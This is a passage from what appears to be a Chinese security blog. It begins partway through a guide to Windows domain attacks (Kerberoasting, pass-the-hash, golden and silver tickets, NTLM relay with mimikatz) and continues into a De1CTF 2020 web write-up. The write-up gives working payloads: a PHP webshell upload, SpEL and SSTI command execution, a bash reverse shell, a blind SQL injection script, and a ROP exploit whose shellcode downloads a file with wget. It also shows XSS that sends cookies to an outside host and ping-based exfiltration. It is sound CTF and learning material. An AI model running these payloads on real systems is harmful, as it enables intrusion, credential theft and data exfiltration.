&#123;AdminCount -eq 1 -and (servicePrincipalName -ne 0)&#125; -prop * |select name,whencreated,pwdlastset,lastlogon</code></pre></li><li><p>使用PowerView</p><p>脚本地址：</p><p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p><pre><code class="cmd">Get-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,lastlogon</code></pre></li><li><p>使用kerberoast</p><p>脚本地址：</p><p>（powershell）<a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1</a></p><p>（vbs）<a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs</a></p><pre><code class="cmd">cscript GetUserSPNs.vbs</code></pre></li></ol></li><li><p>请求TGS，执行后输入<code>klist</code>查看内存中的票据，可找到获得的TGS。</p><ol><li><p>请求指定TGS</p><pre><code class="cmd">$SPNName = &#39;MSSQLSvc/DC1.test.com&#39;Add-Type -AssemblyNAme System.IdentityModelNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName</code></pre></li><li><p>请求所有TGS</p><pre><code class="cmd">Add-Type -AssemblyName System.IdentityModel  setspn.exe -q */* | Select-String &#39;^CN&#39; -Context 0,1 | % &#123; New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() &#125;  </code></pre></li></ol></li><li><p>导出TGS</p><pre><code class="cmd">mimikatz # kerberos::list /export</code></pre></li><li><p>破解</p><p>脚本地址：</p><p><a href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py">https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py</a></p><pre><code class="cmd">./tgsrepcrack.py wordlist.txt test.kirbi</code></pre></li></ol><h4 id="自动化脚本"><a href="#自动化脚本" class="headerlink" title="自动化脚本"></a>自动化脚本</h4><p>自动实现，并且不需要mimikatz，普通用户权限即可</p><p>参考资料：</p><p><a href="http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/">http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/</a></p><p>代码地址：</p><p><a href="http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/">http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/</a></p><p><strong>利用步骤</strong></p><ol><li><p>在域内一台主机上以普通用户权限执行</p><pre><code class="cmd">Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | fl</code></pre></li><li><p>只提取hash参数</p><pre><code class="cmd">Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation</code></pre></li><li><p>使用hashcat破解</p><pre><code class="cmd">hashcat -m 13100 /tmp/hash.txt /tmp/password.list -o found.txt --force</code></pre></li></ol><h3 id="Pth（Pass-the-hash）"><a href="#Pth（Pass-the-hash）" class="headerlink" title="Pth（Pass the hash）"></a>Pth（Pass the hash）</h3><p>直接通过LM Hash和NTLM Hash访问远程主机或服务，而不用提供明文密码。</p><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><ul><li>在Windows系统中，通常会使用NTLM身份认证</li><li>NTLM认证不使用明文口令，而是使用口令加密后的hash值，hash值由系统API生成(例如LsaLogonUser)</li><li>hash分为LM hash和NT hash，如果密码长度大于15，那么无法生成LM hash。从Windows Vista和Windows Server 2008开始，微软默认禁用LM hash</li><li>如果攻击者获得了hash，就能够在身份验证的时候模拟该用户(即跳过调用API生成hash的过程)</li></ul><h4 id="适用范围"><a href="#适用范围" class="headerlink" title="适用范围"></a>适用范围</h4><ul><li>域/工作组环境</li><li>可以获得hash，但是条件不允许对hash爆破</li><li>内网中存在和当前机器相同的密码</li></ul><blockquote><p>微软对 Pth 打过补丁，但是默认的 Administrator(SID 500) 账号还可以使用 Pth。</p><p>如果禁用了 ntlm 认证，PsExec 无法利用获得的 ntlm hash 进行远程连接，但是使用 mimikatz 还是可以攻击成功。</p></blockquote><h4 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><blockquote><p>mimikatz的pth功能需要本地管理员权限，这是由它的实现机制决定的，需要先获得高权限进程lsass.exe的信息</p><p>对于8.1/2012r2，安装补丁kb2871997的Win 7/2008r2/8/2012，可以使用AES keys代替NT hash</p></blockquote><p>获取 hash</p><pre><code class="cmd">mimikatz # privilege::debugmimikatz # sekurlsa::logonpasswords</code></pre><p>pth</p><pre><code class="cmd">mimikatz # sekurlsa::pth /user:[Username] /domain:workgroup /ntlm:[NTLM]</code></pre><h4 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h4><p><strong>Invoke-TheHash</strong></p><p><a href="https://github.com/Kevin-Robertson/Invoke-TheHash">https://github.com/Kevin-Robertson/Invoke-TheHash</a></p><pre><code class="cmd">Invoke-Module Invoke-TheHash.psd1Invoke-WMIExec -Target 192.168.3.21 -Domain workgroup -Username administrator -Hash ccef208c6485269c20db2cad21734fe7 -Command &quot;calc.exe&quot; -verbose</code></pre><p><strong>Invoke-SMBExec</strong></p><blockquote><p>支持SMB1，SMB2 (2.1)，and SMB signing，</p></blockquote><pre><code class="cmd">Invoke-SMBExec -Target 192.168.3.21 -Domain test.local -Username test1 -Hash ccef208c6485269c20db2cad21734fe7 -Command &quot;calc.exe&quot; -verbose</code></pre><p><strong>Invoke-SMBClient</strong></p><blockquote><p>支持SMB1, SMB2 (2.1), and SMB signing，如果只有SMB文件共享的权限，没有远程执行权限，可以使用该脚本。</p><p>支持的功能包括列举目录、上传文件、下载文件、删除文件(具体权限取决于该口令hash的权限)</p></blockquote><p><strong>wmiexec.py</strong></p><p><a href="https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py">https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py</a></p><p><strong>wmiexec.exe</strong></p><p><a href="https://github.com/maaaaz/impacket-examples-windows">https://github.com/maaaaz/impacket-examples-windows</a></p><blockquote><p>wmiexec.exe通过python impacket库实现的，生成的exe有点大，5M大小在实战起来有点不方便</p></blockquote><pre><code class="cmd">wmiexec -hashes 00000000000000000000000000000000:ccef208c6485269c20db2cad21734fe7 workgroup/administrator@192.168.3.21 &quot;whoami&quot;</code></pre><blockquote><p>wmiexec.py的hash参数格式为 LM Hash:NT Hash ，由于该Hash来自于Server 2008，系统默认不支持LM hash，所以LM hash可以设定为任意值</p></blockquote><h3 id="Ptt（Pass-the-ticket）"><a href="#Ptt（Pass-the-ticket）" class="headerlink" title="Ptt（Pass the ticket）"></a>Ptt（Pass the ticket）</h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>如果我们能够拿到用户的TGT，并将其导入到内存，就可以冒充该用户获得其访问权限。</p><p>利用Kerberos协议进行攻击，三种常用的攻击方法是MS16-068，Golden ticket，Silver ticket。</p><h4 id="MS16-068"><a href="#MS16-068" class="headerlink" title="MS16-068"></a>MS16-068</h4><p>MS14-068是密钥分发中心（KDC）服务中的Windows漏洞。它允许经过身份验证的用户在其Kerberos票证（TGT）中插入任意PAC（表示所有用户权限的结构）。该漏洞位于kdcsvc.dll域控制器的密钥分发中心（KDC）中。用户可以通过呈现具有改变的PAC的Kerberos TGT来获得票证.</p><blockquote><p>ms14-068详细介绍：<a href="https://www.freebuf.com/vuls/56081.html">https://www.freebuf.com/vuls/56081.html</a></p><p>微软给出的补丁是kb3011780</p></blockquote><p>简单来说就是：</p><p>windows域中使用kerberos协议过程中，为了让SS服务器判断Client是否有权限访问服务，引入了PAC机制。构造PAC也是这个漏洞的根本。</p><ol><li>在请求AS时，将require_PAC设置成False。</li><li>在请求TGS时，构造PAC，然后使用MD5签名（PAC尾部的签名算法可以任意指定），PAC并没有放在TGT中发送，而是在请求包的其他位置（但是还是可以解析）。</li><li>TGS_REP返回的不是会话密钥，而是返回的带PAC的TGT。</li></ol><p><strong>利用工具</strong></p><p><a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">ms14-068</a></p><p><strong>利用步骤</strong></p><ol><li><p>使用 whoami/user 得到普通域用户的sid</p></li><li><p>执行payload生成TGT票据（.ccache文件）</p><pre><code>ms14-068.exe -u 域成员名@域名 -s 域成员sid -d 域控制器地址 -p 域成员密码</code></pre></li><li><p>票据注入，使用mimikatz将票据注入到当前内存中，伪造凭证，如果成功则拥有域管理权限，可任意访问域中所有机器，成功后会显示<code>Injecting ticket : OK</code></p><pre><code class="cmd">mimikatz # kerberos::purge         //清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造mimikatz # kerberos::list          //查看当前机器凭证mimikatz # kerberos::ptc 票据文件   //将票据注入到内存中</code></pre></li></ol><p><strong>利用工具</strong> </p><p><a href="https://github.com/gentilkiwi/kekeo/releases">kekeo</a></p><p><strong>利用步骤</strong></p><ol><li><p>生成票据</p><pre><code class="cmd">kekeo # &quot;tgt::ask /user:mary /domain:god.org /ntlm:518b98ad4178a53695dc997aa02d455c&quot;</code></pre></li><li><p>导入票据</p><pre><code class="cmd">kekeo # &quot;kerberos::ptt TGT_mary@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi&quot;</code></pre></li></ol><h4 id="Golden-ticket"><a href="#Golden-ticket" class="headerlink" title="Golden ticket"></a>Golden ticket</h4><p><strong>前提条件</strong></p><ul><li>krbtgt用户的hash(就意味着你已经有域控制器权限了)</li><li>域名称</li><li>域的SID值</li><li>要伪造的用户名</li></ul><p><strong>利用步骤</strong></p><ol><li><p>先登录域控制器，dump krbtgt用户的hash值,获取域sid</p><pre><code class="cmd">mimikatz # privilege::debugmimikatz # lsadump::lsa /patch</code></pre></li><li><p>切换到普通域用户的机器，生成TGT凭证,用户名为administrator</p><pre><code class="cmd">mimikatz # kerberos::golden /user:administrator /doamin::dog.org /sid:[SID] /krbigi:[NTLM]</code></pre></li><li><p>使用mimikatz将凭证注入进去</p><pre><code class="cmd">mimikatz # kerberos::ptt ticket.kirbi</code></pre></li><li><p>如果主机开启了RPC服务，还可以使用WmiExec.vbs直接连接：</p><pre><code class="cmd">cscript &quot;wmiexe v1.1.vbs&quot; /shell 192.168.3.21</code></pre></li></ol><h4 id="Silver-ticket"><a href="#Silver-ticket" class="headerlink" title="Silver ticket"></a>Silver ticket</h4><p>silver ticket和golden ticket不同的是,它不需要和域控制器进行通信，原理是伪造TGS，使用的是计算机账户的hash进行加密的，所以只能访问指定的权限。</p><p><strong>利用步骤</strong></p><ol><li><p>首先登录域控，dump机器hash</p><pre><code class="cmd">mimikatz # privilege::debugmimikatz # sekurlsa::logonpasswords</code></pre></li><li><p>将hash保存下来，在普通域用户机器中进行ptt</p><pre><code class="cmd">mimikatz # kerberos::golden /domain:god.org /sid:[SID]  /target:192.168.3.21 /rc4:[NTLM]  /service:cifs /user:mary /ptt</code></pre><blockquote><p>这里的cifs是指的文件共享服务，有了cifs服务权限，就可以访问域控制器的文件系统</p></blockquote></li></ol><h3 id="Ptk（Pass-the-key）"><a href="#Ptk（Pass-the-key）" class="headerlink" title="Ptk（Pass the key）"></a>Ptk（Pass the key）</h3><h4 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h4><p>由于在进行认证的时候，是用用户hash加密时间戳，即使在使用密码进行登录的情况下，也是先把密码加密成hash，再进行认证。因此在只有用户hash，没有明文密码的情况下也是可以进行认证的。不管是rubeus还是impacket里面的相关脚本都是支持直接使用hash进行认证。其中，如果hash的ntlm hash，然后加密方式是rc4，这种就算做是pass the hash，如果是hash是aes key（使用sekurlsa::ekeys导出来），就算是pass the key。在很多地方，不支持rc4加密方式的时候，使用pass the key不失为一种好方法。</p><h4 id="注入方法"><a href="#注入方法" class="headerlink" title="注入方法"></a>注入方法</h4><ol><li><p>获取用户的aes key</p><pre><code class="cmd">mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::ekeys&quot;</code></pre></li><li><p>注入aes key</p><pre><code class="cmd">mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:mary /domain:god.org /aes256:[aes256_hmac]&quot; </code></pre></li></ol><blockquote><p>如果拒绝访问的话尝试安装kb2871997补丁</p></blockquote><h3 id="NTLM-Relay"><a href="#NTLM-Relay" class="headerlink" title="NTLM Relay"></a>NTLM Relay</h3><blockquote><p>NTLM(v1/v2)的hash是存放在安全账户管理(SAM)数据库以及域控的NTDS.dit数据库中，获取该Hash值可以直接进行PtH攻击。</p><p>Net-NTLM(v1/v2)的hash值是基于用户的NT的hash值经过一定的算法产生的。</p><p>区别：</p><p>Net-NTLM v1 hash相对容易破解，拿到就约等于拿到了NTLM hash</p><p>Net-NTLM v2 hash需要暴力破解（hashcat）</p></blockquote><h4 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h4><p>在使用一些服务的过程中，需要带有windows的自身的认证信息，其实就是Net-NTLM的Hash，而这些东西你可以使用像Responder或者Inveigh这些工具获得。然后你获取了这个Net-NTLM的Hash，就可以转给真正的验证服务器去验证，从而作为攻击者的你就可以通过真实的服务器的身份验证，这种攻击方式就称作NTLM中继攻击。</p><h4 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h4><ul><li>Responder：<a href="https://github.com/SpiderLabs/Responder">https://github.com/SpiderLabs/Responder</a></li><li>Inveigh：<a href="https://github.com/Kevin-Robertson/Inveigh">https://github.com/Kevin-Robertson/Inveigh</a></li><li>smbrealyx：<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbrelayx.py">https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbrelayx.py</a></li></ul><p>参考链接：</p><p><a href="https://www.anquanke.com/post/id/99793">powershell反弹shell常见方式</a></p><p><a href="https://www.anquanke.com/post/id/171552#h2-6">Kerberos协议探索系列之扫描与爆破篇</a></p><p><a href="https://3gstudent.github.io/域渗透-Kerberoasting/">域渗透——Kerberoasting</a></p><p><a href="https://www.cnblogs.com/bmjoker/p/10355979.html">内网渗透之PTH&amp;PTT&amp;PTK</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 De1CTF Web</title>
      <link href="/2020/05/13/2020-De1CTF-Web/"/>
      <url>/2020/05/13/2020-De1CTF-Web/</url>
      
        <content type="html"><![CDATA[<p>de1ta 师傅出的题质量真的太高了，膜拜一下</p><span id="more"></span><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>文件上传题目</p><p>先上传 .htaccess，php 字段使用反斜杠绕过</p><pre><code>AddType application/x-httpd-p\hp .png</code></pre><p>然后上传后缀为 .png 的一句话木马访问即可</p><pre><code>&lt;?= system(&#39;cat /flag&#39;);</code></pre><h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><p>java 计算器题目</p><blockquote><p>这题是环境坏了捡了个漏</p></blockquote><p>抓包修改 <code>clac</code>，添加一些图书字符使其报错，发现是 springboot 框架</p><p>可以知道是 SpEL 表达式注入</p><p>fuzz 之后过滤了以下关键字</p><pre><code>- T\s*\(- \#- new- java\.lang- Runtime- exec.*\(- getRuntime- ProcessBuilder- start- getClass- String</code></pre><p>payload 可以结合 java  的反射机制和字符串拼接可以绕过黑名单</p><pre><code>&quot;&quot;.class.forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getDeclaredMethods()[15].invoke\(&quot;&quot;.class.forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getDeclaredMethods()[7].invoke(null),&quot;whoami&quot;)</code></pre><p>但是可以执行命令之后发现还有一个 openrasp 的 waf</p><p>当时没什么头绪，但是发现下午的时候它的 openrasp 崩了 ：）</p><p>于是就可以执行命令了，参考下面文章在 java 反弹 shell 然后 cat /flag 就好了</p><p><a href="https://blog.spoock.com/2018/11/25/getshell-bypass-exec/">https://blog.spoock.com/2018/11/25/getshell-bypass-exec/</a></p><pre><code>/bin/bash -c bash$&#123;IFS&#125;-i$&#123;IFS&#125;&gt;&amp;/dev/tcp/xxx.xxx.xxx.xxx/9999&lt;&amp;1</code></pre><p>复现的时候才知道，有 waf 的情况下可以直接读文件</p><pre><code>&quot;&quot;.class.forName(&quot;java.nio.ByteBuffer&quot;).wrap(&quot;&quot;.class.forName(&quot;java.nio.file.Files&quot;).readAllBytes(&quot;&quot;.class.forName(&quot;java.nio.file.Paths&quot;).get(&quot;/flag&quot;))).get(&#123;&#125;)</code></pre><h2 id="mixture"><a href="#mixture" class="headerlink" title="mixture"></a>mixture</h2><p>limit 注入 + .so 拓展逆向题目</p><h3 id="limit-注入"><a href="#limit-注入" class="headerlink" title="limit 注入"></a>limit 注入</h3><p>打开 member.php 有一个 orderby 提示</p><p><img src="https://i.loli.net/2020/05/11/O9s7LmWvQ5ilr4J.png" alt="image-20200511105951203.png"></p><p>fuzz 了很久页面还是毫无变化，黑名单是以下关键字</p><pre><code>-  if- regexp- sleep- union- desc- rand- extractvalue- updatexml - ^- ||- &amp;&amp;</code></pre><p>过了很久才测出下面 payload 页面有变化</p><pre><code>member.php?orderby=limit%201</code></pre><p>这题就和 2019GoogleCTF 的 gLotto 差不多</p><p><a href="https://xz.aliyun.com/t/5503#toc-1">https://xz.aliyun.com/t/5503#toc-1</a></p><pre><code>orderby=is+not+null,+(case+when+(ascii(mid(database(),1,1))=116)+then+(select+benchmark(5000000,sha(1))+from+users+limit+1)+else+null+end)</code></pre><p>利用脚本进行盲注得到密码</p><pre><code class="python">import requests as reqimport timeurl = &quot;http://49.51.251.99/&quot;sess = req.Session()def login():    sess.get(url)    data = &#123;        &quot;username&quot;: &quot;admin1&quot;,        &quot;password&quot;: &quot;admin1&quot;,        &quot;submit&quot;: &quot;submit&quot;    &#125;    sess.post(f&quot;&#123;url&#125;index.php&quot;, data=data)    # print(sess.get(f&quot;&#123;url&#125;member.php&quot;).text)def sqli():    flag = &#39;&#39;    index = 1    while(1):        l = 0        r = 127        m = (l+r)//2        while l&lt;r:            paramsGet = &#123;&quot;orderby&quot;:&quot;is not null, (case when (ascii(mid(((select password from member where id=1)),&#123;&#125;,1))&gt;&#123;&#125;) then (select benchmark(1000000,sha(1)) from users limit 1) else null end)&quot;.format(index, m)&#125;            # first req to get cache            res = sess.get(&quot;http://49.51.251.99/member.php&quot;, params=paramsGet)            # print(paramsGet)            try:                # time blind sqli                res = sess.get(&quot;http://49.51.251.99/member.php&quot;, params=paramsGet, timeout=1)                r = m            except Exception as e:                l = m + 1            finally:                m = (l+r)//2        flag += chr(m)        index += 1        print(f&quot;[*]flag: &#123;flag&#125;&quot;)if __name__ == &quot;__main__&quot;:    login()    sqli()</code></pre><p><img src="https://i.loli.net/2020/05/11/QEqgo65FJKrpjRe.png" alt="image-20200511110704496.png"></p><h3 id="so-拓展逆向"><a href="#so-拓展逆向" class="headerlink" title=".so 拓展逆向"></a>.so 拓展逆向</h3><p>进去之后是一个读文件接口和 phpinfo 页面</p><p>搜索一到一个 <code>Minclude</code> 扩展，然后根据拓展地址下载下来</p><p><img src="https://i.loli.net/2020/05/11/Nk3yDbRYH7xSrmc.png" alt="image-20200511110831912.png"></p><p>后面就交给 @q4n 爷爷去 rop 了，附上队友的脚本</p><pre><code class="python">import requestsfrom pwn import *sess = requests.Session()url = &quot;http://49.51.251.99/&quot;# auto renew sessiondef remote_login():    data = &#123;        &quot;username&quot;: &quot;admin&quot;,        &#39;password&#39;: &quot;goodlucktoyou&quot;,        &#39;submit&#39;: &quot;submit&quot;    &#125;    sess.post(url, data=data)# connect remotedef remote1(filename):    remote_login()    data = &#123;&quot;submit&quot;:&quot;submit&quot;,&quot;search&quot;:filename&#125;    response = sess.post(url + &quot;select.php&quot;, data=data).content    # index = response.rfind(&quot;&lt;br&gt;&quot;.encode())    text = response    print(text)    # download(filename, text)# download filedef download(filename, text):    filename = filename[filename.rfind(&quot;/&quot;) + 1:]    print(&quot;[+] write %s&quot; %(filename))    f = open(filename, &quot;wb&quot;)    f.write(text)    f.close()# test in local dockerdef local(filename):    url = &quot;http://ip:8085/&quot;    data = &#123;        &quot;search&quot;: filename    &#125;    resp = requests.post(url, data=data).content    print(resp)    # return respcontext.arch=&quot;amd64&quot;libc = Nonestack = Nonedef genpayload():    global DEB    # srv    if DEB:        libc = 0x00007f77c0d7c000        stack = 0x00007ffc81aa4000    else:        libc = 0x7f2fb414d000        stack = 0x7ffc338fa000    system = 0x00449C0+libc    pdi=0x0000000000023a5f+libc    psi=0x000000000002440e+libc    pdx=0x0000000000106725+libc    pcx=0x00000000000e898e+libc    pbx=0x000000000002d0d9+libc    print(hex(pbx))    xa=0x0000000000098385+libc    one = libc+0x4484f    mprotect = libc+0x0F4200    ret = 0x000000000002235f+libc    # 0x0000000000106724 : pop r10 ; ret    p10 = 0x0000000000106724+libc    # 0x00000000000351d4 : add rdi, r10 ; jmp rdi    jdi = 0x00000000000351d4 + libc    # 0x0000000000106723 : pop rdx ; pop r10 ; ret    pdxp=0x0000000000106723+libc    # 0x000000000003a2b2 : mov rdi, r9 ; call rdx    pr = 0x000000000003a2b2+libc    getsp = 0x00000000000a35c6+libc # : lea ecx, dword ptr [rax + 1] ; lea r9, qword ptr [rsp + 0x28] ; call rbx    payload = &#39;a&#39;.ljust(0x88,&#39;\x00&#39;) #padding    payload += flat(pdi,stack)    payload += flat(psi,0x21000)    payload += flat(pdx,7)    payload += p64(mprotect)    payload += flat(pbx,pbx)    payload += p64(getsp)    payload += flat(pdxp,jdi)    payload += p64(0xdeadbeef)    payload += flat(pdxp,jdi)    payload += p64(0x30) #r10    payload += p64(pr)    payload += &#39;\x90&#39;*0x28    # shellcode place    code64=&quot;&quot;&quot;sub rsp,0x200xor rax,raxxor     rsi,    rsi            push rsicall here.string &quot;/bin/sh&quot;.byte 0here:pop rdicall here2.string &quot;/tmp/verver&quot;.byte 0here2:pop rdxcall here3.string &quot;/usr/bin/wget&quot;.byte 0here3:pop r8call here4.string &quot;http://ip:2333/&quot;.byte 0here4:pop r9call here6.string &quot;-O&quot;.byte 0here6:pop rsicall here5.string &quot;/tmp/verver&quot;.byte 0here5:pop rbxpush 0push rdxpush rdipush rsppop rsixor rdx,rdxmov al,0x3bsyscallcmp rax, 0jnz exloop:nopjmp loopex:int 3&quot;&quot;&quot;    payload += asm(code64)    return payloadDEB = 0if __name__ == &quot;__main__&quot;:    if DEB:        local(genpayload())    else:        remote1(genpayload())</code></pre><p>反弹 shell 后上去动态 /readflag 前抓一下时钟计算就好了</p><pre><code>trap &#39;&#39; 14</code></pre><h2 id="Hard-pentest1"><a href="#Hard-pentest1" class="headerlink" title="Hard_pentest1"></a>Hard_pentest1</h2><p>无字母 shell + 渗透题目</p><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>一开始文件上传，后缀可以用大小写绕过 <code>pHp</code></p><p>字符限制可以用 <code>$_</code>自增绕过</p><p>附上队友的脚本</p><pre><code class="python">res = []# get a and _prefix =&#39;&#39;&#39;$_=[];$_=@&quot;$_&quot;;$_=$_[&#39;!&#39;==&#39;@&#39;];$___=$_;$__=&#39;_&#39;;&#39;&#39;&#39;.split()res.extend(prefix)# get _GETGET = &quot;GET&quot;for i in GET:    for time in range(ord(i) - ord(&quot;A&quot;)):        res.append(&quot;$_++;&quot;)    res.append(&quot;$__.=$_;&quot;)    res.append(&quot;$_=$___;&quot;)# ($_GET[_])($_GET[__],$_GET[___]);res.append(&quot;($&#123;$__&#125;[_])($&#123;$__&#125;[__],$&#123;$__&#125;[___]);&quot;)with open(&quot;shell.php&quot;, &quot;w&quot;) as f:    for i in res:        f.write(f&quot;&lt;?= &#123;i.strip()[:-1]&#125; ?&gt;&quot;)        f.write(&quot;\n&quot;)    f.close()</code></pre><p>然后就可以使用 <code>file_put_contents</code> 进行写马了</p><h3 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h3><p>具体用到的是一个组策略 gpp 的漏洞</p><blockquote><p>主要参考月亮大哥的思路</p></blockquote><p><code>netstat -ano</code>查看一下网络信息发现有一台<code>192.168.0.12</code>的主机</p><p><code>net user /domain</code>查看域发现有一个<code>HintZip_Pass</code>用户</p><p><img src="https://i.loli.net/2020/05/11/stGrgkidj2FlZHf.png" alt="image-20200511112144407.png"></p><p><code>net user HintZip_Pass /domain</code>继续查看该账户</p><p><img src="https://i.loli.net/2020/05/11/D3WNgCV4cXaJLqO.png" alt="image-20200511112304043.png"></p><p>查看域控信息</p><p><img src="https://i.loli.net/2020/05/11/tdEDUC9jaX6IFnQ.png" alt="image-20200511112406373.png"></p><p>挂载查看 <code>Hint</code> 信息</p><pre><code>net use e: \\192.168.0.12\Hintcd /d e:</code></pre><p><img src="https://i.loli.net/2020/05/11/8I9bB3m1kaZRcrz.png" alt="image-20200511112525140.png"></p><p>发现一个加密压缩包</p><p>挂载再查看 <code>SYSVOL</code> 信息</p><pre><code>net use e: \\192.168.0.12\SYSVOLcd /d e:</code></pre><p>使用<code>tree</code>查看目录结构</p><p><img src="https://i.loli.net/2020/05/11/HnZM3e1DvR2tP9B.png" alt="image-20200511112734995.png"></p><p>这个<code>Groups</code>文件夹, 有GPP漏洞</p><p><img src="https://i.loli.net/2020/05/11/iWKsY2InFlRGBN7.png" alt="image-20200511112822374.png"></p><p>使用 kali 的 <code>gpp-decrypt</code> 工具解密即可拿到解压密码</p><h2 id="mc-logclient"><a href="#mc-logclient" class="headerlink" title="mc_logclient"></a>mc_logclient</h2><p>SSTI 题目</p><p>简单说一下题目逻辑就是写文件和读文件前都需要校验 <code>work</code> 这个是可以简单爆破的，先读文件才能进行写文件（这个不重要），读文件可以出发 SSTI 漏洞</p><pre><code class="python">def get_work(text, result):    chrset = string.ascii_letters + string.digits    for c1 in chrset:        for c2 in chrset:            for c3 in chrset:                for c4 in chrset:                    s4 = c1 + c2 + c3 + c4                    tmp_result = hashlib.sha256((text + s4).encode()).hexdigest()                    if tmp_result == result:                        print(f&quot;[*] right work: &#123;s4&#125;&quot;)                        return s4</code></pre><p>SSTI 的黑名单如下，问题不大，可以用 request 绕过</p><pre><code># Some bad words.blacklist = [&#39;+&#39;, &#39;,&#39;, &#39;:&#39;, &#39;\&#39;\&#39;&#39;, &#39;&quot;&quot;&#39;, &#39;%&#39;, &#39;lower&#39;, &#39;upper&#39;, &#39;builtin&#39;, &#39;fork&#39;, &#39;exec&#39;, &#39;walk&#39;, &#39;open&#39;, &#39;spawn&#39;, &#39;reload&#39;, &#39;exit&#39;, &#39;bin&#39;, &#39;sh&#39;, &#39;cat&#39;, &#39;config&#39;, &#39;secret&#39;, &#39;key&#39;, &#39;flag&#39;]# Posix is a bad module, filter it all.for i in dir(posix):    blacklist.append(i.lower())</code></pre><blockquote><p>这里过滤的是 ‘’ 而不是 ‘ 当时被坑了</p></blockquote><p>给出一个简单的 payload</p><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['system'](request.args.b)&#125;&#125;</code></pre><p>虽然是可以命令执行了，但是当时什么外带命令都打不出来，赛后发现是可以用 ping 进行外带数据</p><p>客户端执行</p><pre><code>ping -c 1 -p `/readflag` [your vps]</code></pre><p>vps 执行</p><pre><code>tcpdump -c 2 -q -XX -vvv -nn -i eth0 icmp</code></pre><p>就可以监听到 flag 数据了，但是 icmp 包最大只能接收84长度的数据包，所有要打多几次</p><p>官方 wp 利用新特性 <code>breakpointhook</code> 的方法</p><p><a href="https://github.com/impakho/de1ctf-mc_challs/tree/master/writeup/mc_logclient">https://github.com/impakho/de1ctf-mc_challs/tree/master/writeup/mc_logclient</a></p><h2 id="Animal-Crossing"><a href="#Animal-Crossing" class="headerlink" title="Animal Crossing"></a>Animal Crossing</h2><p>XSS 题目</p><p>一进来是个好看的动森界面</p><p><img src="https://i.loli.net/2020/05/11/rFSQIdENuq4mRoa.png" alt="image.png"></p><p>经过 fuzz 可以发现 name、fruit 和 username 处有转义，title 处有 waf，显然注入点就在 title，但是直接加了单引号被 waf 了，而且 \x 编码绕不过就迷茫了，后来才发现不是单引号被 waf 了，是报错被 waf 了 ：）</p><p>title 可以直接单引号注释逃逸</p><pre><code>titile=1&#39;//</code></pre><p>看看 CSP，支持内联标签</p><pre><code>Content-Security-Policy: default-src &#39;self&#39; &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;;object-src &#39;none&#39;;</code></pre><p>黑名单绕过就使用 base64 编码</p><pre><code>1&#39;+open(atob(&#39;payload&#39;))</code></pre><p>以下 payload 可以弹回 cookie，cookie 弹回来就是前一半的 flag</p><pre><code>(function test()&#123;window.location=&quot;http://ip:9999/?f=&quot;+btoa(document.cookie);&#125;()));//</code></pre><p>然后读一下网页源码可以看到有 400 张图片</p><pre><code>(function test()&#123;window.location=&quot;http://ip:9999/?f=&quot;+btoa(document.body.innerHTML);&#125;()));//</code></pre><p>利用 upload 接口把照片带到外面</p><pre><code>(async()=&gt;&#123;    const arr = []    for(let i=1;i&lt;=400;i++) &#123;    res = await fetch(`/island/test_$&#123;String(i).padStart(2,0)&#125;.png`)    data = await res.blob()    const os = new FormData();    const mf = new File([data], &quot;name.png&quot;);    os.append(&quot;file&quot;, mf);    r = await fetch(&quot;/upload&quot;, &#123;method: &quot;POST&quot;,body: os&#125;)    data = await r.json()    arr.push(data.data)    &#125;    location=&quot;http://xxx.xxx.xxx.xxx:9999/?f=&quot;+btoa(JSON.stringify(arr))&#125;)();</code></pre><p>下载图片然后拼图得到后半部分的 flag</p><pre><code class="python">def main(width_len, height_len, result):    img = Image.open(&quot;img//01.png&quot;)    size = img.size    width, height = 